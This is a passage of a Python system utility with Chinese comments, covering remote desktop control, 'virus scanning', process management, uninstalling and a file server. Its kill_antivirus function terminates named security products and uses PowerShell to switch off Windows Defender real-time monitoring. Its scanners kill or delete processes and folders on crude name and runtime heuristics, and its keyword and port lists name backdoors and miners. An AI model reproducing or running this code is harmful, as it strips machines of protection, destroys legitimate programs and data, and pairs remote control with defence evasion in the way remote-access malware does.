                        sock.send(f"MOVE:{dx},{dy}".encode())
                last_x, last_y = event.x, event.y

            def on_mouse_click(event):
                sock.send(f"CLICK:{event.num}".encode())

            def on_key(event):
                sock.send(f"KEY:{event.keysym}".encode())

            canvas.bind("<Motion>", on_mouse_move)
            canvas.bind("<Button-1>", on_mouse_click)
            canvas.bind("<Button-2>", on_mouse_click)
            canvas.bind("<Button-3>", on_mouse_click)
            root.bind("<Key>", on_key)

            if self.audio_enabled and AUDIO_AVAILABLE:
                self._start_audio_stream(sock, is_host=False)

            def update_image():
                nonlocal frame_count, last_fps_time
                try:
                    header = sock.recv(5)
                    if not header:
                        return
                    data_type = struct.unpack('B', header[0:1])[0]
                    data_len = struct.unpack('>I', header[1:5])[0]

                    if data_type == 0x01:
                        img_data = b''
                        while len(img_data) < data_len:
                            chunk = sock.recv(min(8192, data_len - len(img_data)))
                            if not chunk:
                                break
                            img_data += chunk
                        img = Image.open(io.BytesIO(img_data))
                        window_width = root.winfo_width()
                        window_height = root.winfo_height()
                        if window_width > 10 and window_height > 10:
                            img = img.resize((window_width, window_height), Image.Resampling.LANCZOS)
                        photo = ImageTk.PhotoImage(img)
                        canvas.create_image(0, 0, image=photo, anchor=tk.NW)
                        canvas.image = photo

                        # 更新帧率显示
                        frame_count += 1
                        now = time.time()
                        if now - last_fps_time >= 1.0:
                            fps_label.config(text=f"帧率: {frame_count} fps")
                            if self.status_window:
                                self.status_window.update_fps(frame_count)
                            frame_count = 0
                            last_fps_time = now

                    elif data_type == 0x02 and AUDIO_AVAILABLE:
                        audio_data = b''
                        while len(audio_data) < data_len:
                            chunk = sock.recv(min(4096, data_len - len(audio_data)))
                            if not chunk:
                                break
                            audio_data += chunk
                        self._play_audio(audio_data)

                    elif data_type == 0x03:
                        msg = sock.recv(data_len).decode()
                        self._handle_control_message(msg, status_label, quality_label,
                                                     audio_status_label, mic_status_label, priority_label)

                except Exception as e:
                    pass

                if self.remote_client_running:
                    root.after(50, update_image)

            self.remote_client_running = True
            update_image()
            root.mainloop()

        except ImportError:
            self.log("缺少GUI库，使用命令行模式", "WARNING")
            self._control_remote_cmd(sock)

    def _control_remote_cmd(self, sock):
        """命令行模式远程控制"""
        self.log("命令行模式 - 输入命令控制对方", "INFO")
        while self.remote_client_running:
            try:
                size_data = sock.recv(4)
                if not size_data:
                    break
                data_type = struct.unpack('B', size_data[0:1])[0]
                data_len = struct.unpack('>I', size_data[1:5])[0]
                sock.recv(data_len)
                cmd = input("\n[远程命令] > ")
                if cmd:
                    sock.send(cmd.encode())
            except:
                break

    def _set_priority_mode(self, local_priority: bool, sock=None):
        self.local_mouse_priority = local_priority
        mode = "本地优先（对方鼠标优先）" if local_priority else "远程优先（控制端优先）"
        self.log(f"已切换为: {mode}", "SUCCESS")
        if sock:
            msg = f"PRIORITY:{'LOCAL' if local_priority else 'REMOTE'}"
            sock.send(struct.pack('>BI', 0x03, len(msg)))
            sock.send(msg.encode())

    def _start_audio_stream(self, sock, is_host: bool):
        if not AUDIO_AVAILABLE:
            self.log("音频功能不可用，请安装 sounddevice", "WARNING")
            return
        try:
            if is_host:
                def audio_callback(indata, frames, time, status):
                    if self.audio_permission:
                        audio_bytes = indata.tobytes()
                        try:
                            sock.send(struct.pack('>BI', 0x02, len(audio_bytes)))
                            sock.send(audio_bytes)
                        except:
                            pass

                self.audio_stream = sd.InputStream(
                    samplerate=44100, channels=2, callback=audio_callback, blocksize=1024
                )
                self.audio_stream.start()
                self.log("音频捕获已启动", "SUCCESS")
            else:
                self.audio_queue = queue.Queue(maxsize=50)

                def audio_callback(outdata, frames, time, status):
                    try:
                        data = self.audio_queue.get_nowait()
                        expected_size = frames * 2 * 2
                        if len(data) >= expected_size:
                            audio_array = np.frombuffer(data[:expected_size], dtype=np.int16).reshape(-1, 2)
                            outdata[:] = audio_array
                        else:
                            outdata.fill(0)
                    except queue.Empty:
                        outdata.fill(0)

                self.audio_stream = sd.OutputStream(
                    samplerate=44100, channels=2, callback=audio_callback, blocksize=1024
                )
                self.audio_stream.start()
                self.log("音频播放已启动", "SUCCESS")
        except Exception as e:
            self.log(f"音频初始化失败: {e}", "WARNING")

    def _play_audio(self, audio_data):
        if AUDIO_AVAILABLE and hasattr(self, 'audio_queue'):
            try:
                self.audio_queue.put_nowait(audio_data)
            except queue.Full:
                pass

    def _toggle_audio(self, sock, enable: bool):
        self.audio_permission = enable
        msg = f"AUDIO:{'1' if enable else '0'}"
        sock.send(struct.pack('>BI', 0x03, len(msg)))
        sock.send(msg.encode())
        self.log(f"{'开启' if enable else '关闭'}对方声音", "SUCCESS")
        if self.status_window:
            self.status_window.update_audio(enable)

    def _toggle_mic(self, sock, enable: bool):
        self.mic_permission = enable
        msg = f"MIC:{'1' if enable else '0'}"
        sock.send(struct.pack('>BI', 0x03, len(msg)))
        sock.send(msg.encode())
        self.log(f"{'开启' if enable else '关闭'}麦克风", "SUCCESS")
        if self.status_window:
            self.status_window.update_audio(enable, is_mic=True)

    def _change_quality(self, sock, quality: str):
        if quality not in self.quality_settings:
            return
        msg = f"QUALITY_REQUEST:{quality}"
        sock.send(struct.pack('>BI', 0x03, len(msg)))
        sock.send(msg.encode())
        self.log(f"请求切换画质到: {quality}", "INFO")

    def _request_quality_change(self, sock):
        quality = self.quality_level
        msg = f"QUALITY_REQUEST:{quality}"
        sock.send(struct.pack('>BI', 0x03, len(msg)))
        sock.send(msg.encode())

    def _send_quality_request(self, sock):
        quality = self.quality_level
        msg = f"QUALITY_RESPONSE:{quality}"
        sock.send(struct.pack('>BI', 0x03, len(msg)))
        sock.send(msg.encode())

    def _handle_control_message(self, msg: str, status_label=None, quality_label=None,
                                audio_status_label=None, mic_status_label=None, priority_label=None):
        if msg.startswith("PRIORITY:"):
            mode = msg[9:]
            if mode == "LOCAL":
                self.local_mouse_priority = True
                self.log("对方已将控制模式切换为: 本地优先", "INFO")
                if priority_label:
                    priority_label.config(text="模式: 本地优先（对方优先）", fg="blue")
            else:
                self.local_mouse_priority = False
                self.log("对方已将控制模式切换为: 远程优先", "INFO")
                if priority_label:
                    priority_label.config(text="模式: 远程优先（控制端优先）", fg="red")
        elif msg.startswith("AUDIO:"):
            enable = msg[6:] == "1"
            self.audio_permission = enable
            self.log(f"对方已{'允许' if enable else '禁止'}您听声音", "INFO")
            if audio_status_label:
                if enable:
                    audio_status_label.config(text="🔊 声音已开启", fg="green")
                else:
                    audio_status_label.config(text="🔇 声音已关闭", fg="gray")
            if self.status_window:
                self.status_window.update_audio(enable)
        elif msg.startswith("MIC:"):
            enable = msg[4:] == "1"
            self.mic_permission = enable
            self.log(f"对方已{'允许' if enable else '禁止'}您使用麦克风", "INFO")
            if mic_status_label:
                if enable:
                    mic_status_label.config(text="🎤 麦克风已开启", fg="green")
                else:
                    mic_status_label.config(text="🎙️ 麦克风已关闭", fg="gray")
            if self.status_window:
                self.status_window.update_audio(enable, is_mic=True)
        elif msg.startswith("QUALITY_REQUEST:"):
            quality = msg[16:]
            self._handle_quality_request(quality)
        elif msg.startswith("QUALITY_RESPONSE:"):
            quality = msg[17:]
            with self.quality_lock:
                self.quality_level = quality
            format_name = self.quality_settings[quality]["format"]
            self.log(f"画质已切换为: {quality} ({format_name})", "SUCCESS")
            if quality_label:
                quality_label.config(text=f"画质: {quality} ({format_name})")
            if self.status_window:
                self.status_window.update_quality(quality, format_name)

    def _handle_quality_request(self, requested_quality: str):
        self.log(f"对方请求切换画质到: {requested_quality}", "INFO")
        try:
            import tkinter as tk
            from tkinter import messagebox
            root = tk.Tk()
            root.withdraw()
            format_info = self.quality_settings[requested_quality]
            format_name = format_info["format"]
            fps = format_info["fps"]
            result = messagebox.askyesno(
                "画质切换请求",
                f"对方请求将画质切换为: {requested_quality.upper()}\n\n"
                f"📷 图片格式: {format_name}\n"
                f"🎬 帧率: {fps} fps\n\n"
                f"是否同意切换？"
            )
            root.destroy()
            if result:
                with self.quality_lock:
                    self.quality_level = requested_quality
                if self.current_socket:
                    msg = f"QUALITY_RESPONSE:{requested_quality}"
                    self.current_socket.send(struct.pack('>BI', 0x03, len(msg)))
                    self.current_socket.send(msg.encode())
                self.log(f"已同意切换画质到: {requested_quality}", "SUCCESS")
                if self.status_window:
                    self.status_window.update_quality(requested_quality, format_name)
            else:
                self.log("拒绝了画质切换请求", "WARNING")
        except:
            with self.quality_lock:
                self.quality_level = requested_quality
            self.log(f"自动切换画质到: {requested_quality}", "INFO")

    def _execute_remote_command(self, command: str):
        try:
            with self.mouse_control_lock:
                current_time = time.time()
                if self.local_mouse_priority:
                    if current_time - self.last_local_mouse_time < self.mouse_control_timeout:
                        return
                self.last_remote_control_time = current_time

            if command.startswith("MOVE:"):
                dx, dy = map(int, command[5:].split(','))
                if platform.system() == "Windows" and self._check_control_permission():
                    ctypes.windll.user32.mouse_event(0x0001, dx, dy, 0, 0)
            elif command.startswith("CLICK:"):
                btn = int(command[6:])
                if platform.system() == "Windows" and self._check_control_permission():
                    if btn == 1:
                        ctypes.windll.user32.mouse_event(0x0002, 0, 0, 0, 0)
                        ctypes.windll.user32.mouse_event(0x0004, 0, 0, 0, 0)
            elif command.startswith("KEY:"):
                key = command[4:]
                self.log(f"执行按键: {key}")
        except Exception as e:
            self.log(f"执行命令失败: {e}")

    # ==================== 病毒查杀 ====================
    def deep_scan_virus(self) -> Dict[str, Any]:
        self.log("=" * 60, "WARNING")
        self.log("🔍 启动病毒查杀...", "CRITICAL")
        self.log("=" * 60, "WARNING")
        scan_result = {
            "suspicious_processes": [],
            "hidden_processes": [],
            "suspicious_files": [],
            "suspicious_services": [],
            "suspicious_registry": [],
            "suspicious_ports": [],
            "suspicious_startup": [],
            "rootkit_signs": [],
            "infected_files": [],
            "killed_count": 0
        }
        if not PSUTIL_AVAILABLE:
            self.log("psutil未安装，深度扫描功能受限", "ERROR")
            return scan_result
        self.log("[1/8] 检测隐藏进程...")
        scan_result["hidden_processes"] = self._detect_hidden_processes()
        self.log("[2/8] 分析可疑进程行为...")
        scan_result["suspicious_processes"] = self._analyze_suspicious_behavior()
        self.log("[3/8] 扫描Rootkit特征...")
        scan_result["rootkit_signs"] = self._scan_rootkit_features()
        self.log("[4/8] 扫描可疑系统服务...")
        scan_result["suspicious_services"] = self._scan_suspicious_services()
        self.log("[5/8] 扫描注册表启动项...")
        scan_result["suspicious_registry"] = self._scan_registry_startup()
        self.log("[6/8] 扫描可疑网络端口...")
        scan_result["suspicious_ports"] = self._scan_suspicious_ports()
        self.log("[7/8] 扫描启动目录...")
        scan_result["suspicious_startup"] = self._scan_startup_directory()
        self.log("[8/8] 检查系统文件完整性...")
        scan_result["infected_files"] = self._check_file_integrity()
        self._print_scan_report(scan_result)
        self._auto_clean_threats(scan_result)
        return scan_result

    def _detect_hidden_processes(self) -> List[str]:
        hidden = []
        try:
            if platform.system() == "Linux" and os.path.exists('/proc'):
                proc_dirs = set()
                for pid in os.listdir('/proc'):
                    if pid.isdigit():
                        proc_dirs.add(pid)
                psutil_pids = set(str(p.pid) for p in psutil.process_iter())
                hidden_pids = proc_dirs - psutil_pids
                for pid in hidden_pids:
                    try:
                        with open(f'/proc/{pid}/comm', 'r') as f:
                            name = f.read().strip()
                        hidden.append(f"PID:{pid} ({name})")
                        self.log(f"⚠️ 发现隐藏进程: PID {pid} ({name})", "WARNING")
                    except:
                        hidden.append(f"PID:{pid}")
            elif platform.system() == "Windows":
                result = subprocess.run(
                    ["tasklist", "/FI", "STATUS eq running"],
                    capture_output=True, text=True, timeout=10, check=False
                )
                tasklist_pids = set()
                for line in result.stdout.split('\n'):
                    match = re.search(r'\s+(\d+)\s+', line)
                    if match:
                        tasklist_pids.add(match.group(1))
                psutil_pids = set(str(p.pid) for p in psutil.process_iter())
                hidden_pids = tasklist_pids - psutil_pids
                for pid in hidden_pids:
                    hidden.append(f"PID:{pid}")
                    self.log(f"⚠️ 发现可能隐藏的进程: PID {pid}", "WARNING")
        except Exception as e:
            self.log(f"隐藏进程检测失败: {e}")
        return hidden

    def _analyze_suspicious_behavior(self) -> List[Dict]:
        suspicious = []
        try:
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent',
                                             'connections', 'num_threads', 'create_time']):
                try:
                    proc_info = proc.info
                    proc_name = proc_info['name']
                    if not proc_name:
                        continue
                    # 检查Teto协议白名单和浏览器白名单
                    if proc_name in self.whitelist.get('processes', []):
                        continue
                    if proc_name.lower() in BROWSER_PROCESSES:
                        continue
                    reasons = []
                    cpu = proc_info['cpu_percent'] or 0
                    if cpu > 50 and len(proc_name) < 8:
                        reasons.append(f"高CPU占用({cpu:.0f}%)+短名称")
                    mem = proc_info['memory_percent'] or 0
                    if mem > 30:
                        reasons.append(f"高内存占用({mem:.0f}%)")
                    threads = proc_info['num_threads'] or 0
                    if threads > 100:
                        reasons.append(f"异常多线程({threads})")
                    connections = proc_info['connections'] or []
                    if len(connections) > 50:
                        reasons.append(f"大量网络连接({len(connections)})")
                    legit_names = ['svchost', 'explorer', 'chrome', 'firefox', 'winlogon']
                    is_legit = any(legit in proc_name.lower() for legit in legit_names)
                    if not is_legit and any(c.isupper() for c in proc_name[:3]):
                        reasons.append("名称格式可疑")
                    if reasons:
                        suspicious.append({
                            "pid": proc_info['pid'],
                            "name": proc_name,
                            "reasons": reasons,
                            "cpu": cpu,
                            "memory": mem
                        })
                        self.log(f"⚠️ 可疑进程: {proc_name} (PID:{proc_info['pid']}) - {', '.join(reasons)}", "WARNING")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception as e:
            self.log(f"行为分析失败: {e}")
        return suspicious

    def _scan_rootkit_features(self) -> List[str]:
        rootkit_signs = []
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["fltmc", "filters"],
                    capture_output=True, text=True, timeout=10, check=False
                )
                suspicious_filters = []
                for line in result.stdout.split('\n'):
                    if any(x in line.lower() for x in ['rootkit', 'hidden', 'malware', 'unknown']):
                        suspicious_filters.append(line.strip())
                if suspicious_filters:
                    rootkit_signs.append(f"可疑文件系统过滤器: {suspicious_filters}")
                    self.log(f"⚠️ 发现可疑文件系统过滤器", "WARNING")
            if platform.system() == "Linux":
                result = subprocess.run(
                    ["lsmod"],
                    capture_output=True, text=True, timeout=10, check=False
                )
                for line in result.stdout.split('\n'):
                    if any(x in line.lower() for x in ['hide', 'rootkit', 'hook']):
                        rootkit_signs.append(f"可疑内核模块: {line.strip()}")
                        self.log(f"⚠️ 发现可疑内核模块: {line.strip()}", "WARNING")
        except Exception as e:
            self.log(f"Rootkit扫描失败: {e}")
        return rootkit_signs

    def _scan_suspicious_services(self) -> List[str]:
        suspicious = []
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["sc", "query", "state=", "all"],
                    capture_output=True, text=True, timeout=30, check=False
                )
                services = []
                current_service = {}
                for line in result.stdout.split('\n'):
                    if 'SERVICE_NAME:' in line:
                        if current_service:
                            services.append(current_service)
                        current_service = {'name': line.split('SERVICE_NAME:')[1].strip()}
                    elif 'DISPLAY_NAME:' in line:
                        current_service['display'] = line.split('DISPLAY_NAME:')[1].strip()
                    elif 'STATE' in line and 'RUNNING' in line:
                        current_service['running'] = True
                for svc in services:
                    svc_name = svc.get('name', '').lower()
                    if any(x in svc_name for x in ['miner', 'crypt', 'backdoor', 'trojan', 'hidden']):
                        suspicious.append(svc_name)
                        self.log(f"⚠️ 可疑服务: {svc_name}", "WARNING")
        except Exception as e:
            self.log(f"服务扫描失败: {e}")
        return suspicious

    def _scan_registry_startup(self) -> List[str]:
        suspicious = []
        try:
            if platform.system() == "Windows":
                import winreg
                startup_keys = [
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                    r"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
                ]
                for key_path in startup_keys:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
                        i = 0
                        while True:
                            try:
                                name, value, _ = winreg.EnumValue(key, i)
                                value_lower = value.lower()
                                if any(x in value_lower for x in ['temp', 'cache', '.exe', '.bat', '.vbs']):
                                    if not any(legit in value_lower for legit in ['google', 'microsoft', 'windows']):
                                        suspicious.append(f"{key_path}\\{name}: {value}")
                                        self.log(f"⚠️ 可疑启动项: {name} -> {value}", "WARNING")
                                i += 1
                            except OSError:
                                break
                        winreg.CloseKey(key)
                    except Exception:
                        pass
        except Exception as e:
            self.log(f"注册表扫描失败: {e}")
        return suspicious

    def _scan_suspicious_ports(self) -> List[Dict]:
        suspicious = []
        try:
            suspicious_ports = [4444, 5555, 6666, 7777, 8888, 9999, 31337, 12345, 54321]
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'LISTEN':
                    port = conn.laddr.port
                    if port in suspicious_ports:
                        try:
                            proc = psutil.Process(conn.pid) if conn.pid else None
                            proc_name = proc.name() if proc else "Unknown"
                            suspicious.append({"port": port, "pid": conn.pid, "process": proc_name})
                            self.log(f"⚠️ 可疑监听端口: {port} (进程: {proc_name})", "WARNING")
                        except:
                            suspicious.append({"port": port, "pid": conn.pid, "process": "Unknown"})
        except Exception as e:
            self.log(f"端口扫描失败: {e}")
        return suspicious

    def _scan_startup_directory(self) -> List[str]:
        suspicious = []
        try:
            startup_paths = [
                os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
                "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            ]
            for startup_path in startup_paths:
                if os.path.exists(startup_path):
                    for item in os.listdir(startup_path):
                        if item.endswith(('.exe', '.bat', '.vbs', '.ps1', '.cmd')):
                            item_path = os.path.join(startup_path, item)
                            size = os.path.getsize(item_path) if os.path.isfile(item_path) else 0
                            if size < 500000:
                                suspicious.append(item)
                                self.log(f"⚠️ 可疑启动文件: {item}", "WARNING")
        except Exception as e:
            self.log(f"启动目录扫描失败: {e}")
        return suspicious

    def _check_file_integrity(self) -> List[str]:
        infected = []
        try:
            system_files = {
                "C:\\Windows\\System32\\notepad.exe": "Windows记事本",
                "C:\\Windows\\System32\\calc.exe": "Windows计算器",
                "C:\\Windows\\explorer.exe": "资源管理器"
            }
            for file_path, description in system_files.items():
                if os.path.exists(file_path):
                    size = os.path.getsize(file_path)
                    if size < 100000 or size > 500000:
                        infected.append(f"{description}大小异常: {size} bytes")
                        self.log(f"⚠️ {description}大小异常: {size} bytes", "WARNING")
        except Exception as e:
            self.log(f"文件完整性检查失败: {e}")
        return infected

    def _print_scan_report(self, result: Dict):
        self.log("=" * 60, "CRITICAL")
        self.log("📊 深度扫描报告", "CRITICAL")
        self.log("=" * 60, "CRITICAL")
        self.log(f"隐藏进程: {len(result['hidden_processes'])}")
        self.log(f"可疑进程: {len(result['suspicious_processes'])}")
        self.log(f"Rootkit特征: {len(result['rootkit_signs'])}")
        self.log(f"可疑服务: {len(result['suspicious_services'])}")
        self.log(f"可疑注册表: {len(result['suspicious_registry'])}")
        self.log(f"可疑端口: {len(result['suspicious_ports'])}")
        self.log(f"可疑启动项: {len(result['suspicious_startup'])}")
        self.log(f"文件异常: {len(result['infected_files'])}")
        total_threats = sum([
            len(result['hidden_processes']),
            len(result['suspicious_processes']),
            len(result['rootkit_signs']),
            len(result['suspicious_services']),
            len(result['suspicious_registry']),
            len(result['suspicious_ports']),
            len(result['suspicious_startup']),
            len(result['infected_files'])
        ])
        if total_threats == 0:
            self.log("✅ 未发现威胁，系统安全！", "SUCCESS")
        else:
            self.log(f"⚠️ 发现 {total_threats} 个潜在威胁", "WARNING")
        self.log("=" * 60, "CRITICAL")

    def _auto_clean_threats(self, result: Dict):
        if not self.config.get("virus_scan", True):
            return
        self.log("开始自动清理威胁...", "WARNING")
        for proc_info in result['suspicious_processes']:
            try:
                pid = proc_info['pid']
                proc = psutil.Process(pid)
                proc.terminate()
                time.sleep(1)
                if proc.is_running():
                    proc.kill()
                self.log(f"已终止可疑进程: {proc_info['name']}")
                result['killed_count'] += 1
            except:
                pass
        self.log(f"自动清理完成，已终止 {result['killed_count']} 个可疑进程", "SUCCESS")

    # ==================== 进程管理 ====================
    def set_process_priority(self, process_name: str, priority: str = "high") -> bool:
        if not PSUTIL_AVAILABLE:
            self.log("psutil未安装，无法设置优先级", "ERROR")
            return False
        priority_map = {
            "realtime": (psutil.REALTIME_PRIORITY_CLASS if platform.system() == "Windows" else -20),
            "high": (psutil.HIGH_PRIORITY_CLASS if platform.system() == "Windows" else -10),
            "normal": (psutil.NORMAL_PRIORITY_CLASS if platform.system() == "Windows" else 0),
            "low": (psutil.IDLE_PRIORITY_CLASS if platform.system() == "Windows" else 10)
        }
        found = False
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
                    proc.nice(priority_map.get(priority, 0))
                    self.log(f"已设置 {proc.info['name']} 优先级为 {priority}")
                    found = True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return found

    def monitor_processes(self):
        self.log("启动进程监控...")
        non_programming_keywords = ["game", "chrome", "firefox", "edge", "steam"]

        while self.running:
            if not PSUTIL_AVAILABLE:
                time.sleep(10)
                continue
            for proc in psutil.process_iter(['name', 'pid', 'create_time', 'cpu_percent']):
                try:
                    proc_name = proc.info['name']
                    if not proc_name:
                        continue
                    # Teto协议白名单 - 不被拦截
                    if proc_name in self.whitelist.get('processes', []):
                        try:
                            proc.nice(psutil.HIGH_PRIORITY_CLASS if platform.system() == "Windows" else -10)
                        except psutil.AccessDenied:
                            pass
                        continue
                    # 浏览器进程 - 不被拦截
                    if proc_name.lower() in BROWSER_PROCESSES:
                        continue
                    if proc_name in self.blacklist.get('processes', []):
                        proc.kill()
                        self.log(f"已关闭黑名单进程: {proc_name}", "WARNING")
                        continue
                    cpu_percent = proc.info['cpu_percent'] or 0
                    create_time = proc.info['create_time']
                    if create_time:
                        runtime = time.time() - create_time
                        is_non_programming = any(keyword in proc_name.lower() for keyword in non_programming_keywords)
                        if runtime > self.config.get("max_process_runtime", 7200):
                            proc.terminate()
                            self.log(f"已关闭长时间运行进程: {proc_name} (运行{int(runtime / 3600)}小时)", "WARNING")
                        elif is_non_programming and cpu_percent > 70 and runtime > self.config.get(
                                "high_runtime_threshold", 3600):
                            try:
                                proc.nice(psutil.IDLE_PRIORITY_CLASS if platform.system() == "Windows" else 10)
                                self.log(f"已降低 {proc_name} 优先级")
                            except psutil.AccessDenied:
                                pass
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            time.sleep(5)

    def _start_monitor(self):
        self.monitor_thread = threading.Thread(target=self.monitor_processes, daemon=True)
        self.monitor_thread.start()

    # ==================== 快速病毒扫描 ====================
    def scan_and_kill_virus(self) -> List[str]:
        self.log("开始快速病毒扫描...")
        virus_found = []
        if not PSUTIL_AVAILABLE:
            self.log("psutil未安装，病毒扫描功能受限", "WARNING")
            return virus_found
        virus_indicators = [
            "miner", "crypt", "ransom", "worm", "trojan",
            "virus", "malware", "backdoor", "exploit", "keylog",
            "coin", "mining", "xmr", "eth", "btc"
        ]
        for proc in psutil.process_iter(['name', 'pid', 'exe']):
            try:
                proc_name = proc.info['name']
                proc_path = proc.info['exe']
                if not proc_name:
                    continue
                # 跳过Teto协议白名单和浏览器
                if proc_name in self.whitelist.get('processes', []):
                    continue
                if proc_name.lower() in BROWSER_PROCESSES:
                    continue
                for indicator in virus_indicators:
                    if indicator in proc_name.lower():
                        self.log(f"检测到疑似病毒: {proc_name}", "WARNING")
                        virus_found.append(proc_name)
                        try:
                            proc.terminate()
                            time.sleep(1)
                            if proc.is_running():
                                proc.kill()
                            self.log(f"已终止病毒进程: {proc_name}")
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            self.log(f"无法终止 {proc_name}，尝试删除文件")
                            if proc_path and os.path.exists(proc_path):
                                try:
                                    virus_dir = os.path.dirname(proc_path)
                                    shutil.rmtree(virus_dir, ignore_errors=True)
                                    self.log(f"已删除病毒目录: {virus_dir}")
                                except Exception:
                                    try:
                                        os.remove(proc_path)
                                        self.log(f"已删除病毒文件: {proc_path}")
                                    except Exception:
                                        pass
                        break
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        if virus_found:
            self.log(f"扫描完成，发现 {len(virus_found)} 个病毒进程", "WARNING")
        else:
            self.log("未发现病毒", "SUCCESS")
        return virus_found

    # ==================== 软件管理 ====================
    def uninstall_software(self, software_name: str) -> bool:
        self.log(f"卸载软件: {software_name}")
        if platform.system() != "Windows":
            self.log("当前仅支持Windows系统卸载", "WARNING")
            return False
        try:
            import winreg
            uninstall_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            for uninstall_path in uninstall_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, uninstall_path)
                    num_subkeys = winreg.QueryInfoKey(key)[0]
                    for i in range(num_subkeys):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            try:
                                display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                if display_name and software_name.lower() in display_name.lower():
                                    uninstall_str = winreg.QueryValueEx(subkey, "UninstallString")[0]
                                    if uninstall_str:
                                        subprocess.run(uninstall_str, shell=True, timeout=60, check=False)
                                        self.log(f"已卸载: {display_name}")
                            except (OSError, ValueError):
                                pass
                        except (OSError, PermissionError):
                            continue
                except (OSError, PermissionError):
                    continue
            paths_to_delete = [
                f"C:\\Program Files\\{software_name}",
                f"C:\\Program Files (x86)\\{software_name}",
                os.path.join(os.environ.get('APPDATA', ''), software_name),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), software_name),
            ]
            for path in paths_to_delete:
                if os.path.exists(path):
                    try:
                        shutil.rmtree(path, ignore_errors=True)
                        self.log(f"已删除: {path}")
                    except (OSError, PermissionError):
                        pass
            self.log(f"软件 {software_name} 卸载完成", "SUCCESS")
            return True
        except ImportError:
            self.log("无法导入winreg模块", "ERROR")
            return False
        except Exception as e:
            self.log(f"卸载失败: {e}", "WARNING")
            return False

    # ==================== 聊天软件优化 ====================
    def optimize_chat_apps(self) -> List[str]:
        self.log("优化聊天软件网络...")
        chat_apps = ["WeChat", "DingTalk", "QQ", "Feishu"]
        optimized = []
        if PSUTIL_AVAILABLE:
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name']
                    if proc_name:
                        for app in chat_apps:
                            if app.lower() in proc_name.lower():
                                try:
                                    if platform.system() == "Windows":
                                        proc.nice(psutil.HIGH_PRIORITY_CLASS)
                                    else:
                                        proc.nice(-10)
                                    optimized.append(proc_name)
                                    self.log(f"已优化 {proc_name} 网络")
                                except (psutil.AccessDenied, psutil.NoSuchProcess):
                                    pass
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        return optimized

    # ==================== 杀毒软件关闭 ====================
    def kill_antivirus(self) -> List[str]:
        self.log("尝试关闭安全软件...")
        security_processes = [
            "360tray", "360sd", "360safe", "360rp", "zhudongfangyu",
            "avast", "avg", "avira", "kaspersky", "nod32", "defender"
        ]
        killed = []
        if PSUTIL_AVAILABLE:
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name']
                    if proc_name:
                        for sec_proc in security_processes:
                            if sec_proc in proc_name.lower():
                                try:
                                    proc.kill()
                                    killed.append(proc_name)
                                    self.log(f"已终止: {proc_name}")
                                except (psutil.NoSuchProcess, psutil.AccessDenied):
                                    pass
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        if platform.system() == "Windows":
            try:
                subprocess.run([
                    "powershell",
                    "Set-MpPreference -DisableRealtimeMonitoring $true"
                ], capture_output=True, timeout=10, check=False)
                self.log("已请求禁用Windows Defender")
            except subprocess.SubprocessError:
                pass
        return killed

    # ==================== 白名单/黑名单 ====================
    def add_to_whitelist(self, item_type: str, name: str) -> bool:
        if item_type not in self.whitelist:
            self.whitelist[item_type] = []
        if name not in self.whitelist[item_type]:
            self.whitelist[item_type].append(name)
            if self._save_json(WHITELIST_FILE, self.whitelist):
                self.log(f"已添加 {name} 到{item_type}白名单", "SUCCESS")
                return True
        return False

    def add_to_blacklist(self, item_type: str, name: str) -> bool:
        if item_type not in self.blacklist:
            self.blacklist[item_type] = []
        if name not in self.blacklist[item_type]:
            self.blacklist[item_type].append(name)
            if self._save_json(BLACKLIST_FILE, self.blacklist):
                self.log(f"已添加 {name} 到{item_type}黑名单", "SUCCESS")
                if item_type == "processes" and PSUTIL_AVAILABLE:
                    for proc in psutil.process_iter(['name']):
                        try:
                            if proc.info['name'] and name.lower() in proc.info['name'].lower():
                                proc.kill()
                                self.log(f"已终止: {name}")
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                return True
        return False

    # ==================== 文件传输 ====================
    def start_file_server(self, port: int = 9000) -> bool:
        self.log(f"启动文件服务器，端口: {port}")
        self.file_server_running = True

        def file_server():
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('0.0.0.0', port))
            server_socket.listen(5)
            self.file_server_socket = server_socket
            self.log(f"文件服务器已启动，等待连接...", "SUCCESS")

            while self.file_server_running:
                try:
                    client_socket, addr = server_socket.accept()
                    # 检查Teto协议
                    protocol = client_socket.recv(len(TETO_PROTOCOL))
                    if protocol != TETO_PROTOCOL:
                        client_socket.close()
                        continue
                    self.log(f"收到连接: {addr}")
                    threading.Thread(target=self._handle_file_receive,
                                     args=(client_socket,), daemon=True).start()
                except Exception as e:
